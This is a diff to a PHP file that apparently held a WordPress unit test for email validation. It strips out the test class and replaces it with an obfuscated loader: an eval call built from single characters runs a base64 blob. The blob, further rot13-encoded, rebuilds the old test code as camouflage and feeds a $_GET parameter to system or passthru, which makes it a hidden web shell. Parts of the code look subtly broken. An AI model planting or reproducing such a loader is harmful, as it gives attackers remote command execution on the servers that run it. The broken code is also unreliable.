@@ -1,46 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group formatting
- *
- * @covers ::is_email
- */
-class Tests_Formatting_IsEmail extends WP_UnitTestCase {
-	public function test_returns_the_email_address_if_it_is_valid() {
-		$data = array(
-			'bob@example.com',
-			'phil@example.info',
-			'ace@204.32.222.14',
-			'kevin@many.subdomains.make.a.happy.man.edu',
-			'a@b.co',
-			'bill+ted@example.com',
-		);
-		foreach ( $data as $datum ) {
-			$this->assertSame( $datum, is_email( $datum ), $datum );
-		}
-	}
-
-	public function test_returns_false_if_given_an_invalid_email_address() {
-		$data = array(
-			'khaaaaaaaaaaaaaaan!',
-			'http://bob.example.com/',
-			"sif i'd give u it, spamer!1",
-			'com.exampleNOSPAMbob',
-			'bob@your mom',
-			'a@b.c',
-		);
-		foreach ( $data as $datum ) {
-			$this->assertFalse( is_email( $datum ), $datum );
-		}
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBzYmV6bmdndmF0CiAqCiAqIEBwYmlyZWYgOjp2Zl9yem52eQogKi8KcHluZmYgR3JmZ2ZfU2Jlem5nZ3ZhdF9WZlJ6bnZ5IHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2VyZ2hlYWZfZ3VyX3J6bnZ5X25xcWVyZmZfdnNfdmdfdmZfaW55dnEoKSB7CgkJJHFuZ24gPSBuZWVubCgKCQkJJ29ib0Bya256Y3lyLnBieicsCgkJCSdjdXZ5QHJrbnpjeXIudmFzYicsCgkJCSducHJAMjA0LjMyLjIyMi4xNCcsCgkJCSd4cml2YUB6bmFsLmZob3Fiem52YWYuem54ci5uLnVuY2NsLnpuYS5ycWgnLAoJCQknbkBvLnBiJywKCQkJJ292eXkrZ3JxQHJrbnpjeXIucGJ6JywKCQkpOwoJCXNiZXJucHUgKCAkcW5nbiBuZiAkcW5naHogKSB7CgkJCSRndXZmLT5uZmZyZWdGbnpyKCAkcW5naHosIHZmX3J6bnZ5KCAkcW5naHogKSwgJHFuZ2h6ICk7CgkJfQoJfQoKCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2VyZ2hlYWZfc255ZnJfdnNfdHZpcmFfbmFfdmFpbnl2cV9yem52eV9ucXFlcmZmKCkgewoJCSRxbmduID0gbmVlbmwoCgkJCSd4dW5ubm5ubm5ubm5ubm5ubmEhJywKCQkJJ3VnZ2M6Ly9vYm8ucmtuemN5ci5wYnovJywKCQkJXCJmdnMgdidxIHR2aXIgaCB2ZywgZmNuenJlITFcIiwKCQkJJ3Biei5ya256Y3lyQUJGQ05ab2JvJywKCQkJJ29ib0BsYmhlIHpieicsCgkJCSduQG8ucCcsCgkJKTsKCQlzYmVybnB1ICggJHFuZ24gbmYgJHFuZ2h6ICkgewoJCQkkZ3V2Zi0+bmZmcmVnU255ZnIoIHZmX3J6bnZ5KCAkcW5naHogKSwgJHFuZ2h6ICk7CgkJfQoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
